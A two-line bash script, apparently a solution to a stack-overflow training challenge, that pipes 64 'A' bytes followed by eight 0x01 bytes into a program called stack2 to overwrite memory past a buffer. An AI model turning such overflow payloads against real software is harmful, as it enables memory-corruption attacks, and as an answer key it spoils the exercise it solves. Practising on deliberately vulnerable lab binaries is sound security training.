#!/bin/bash
echo `python -c 'print"A"*64+"\x01\x01\x01\x01\x01\x01\x01\x01"'` | ./stack2
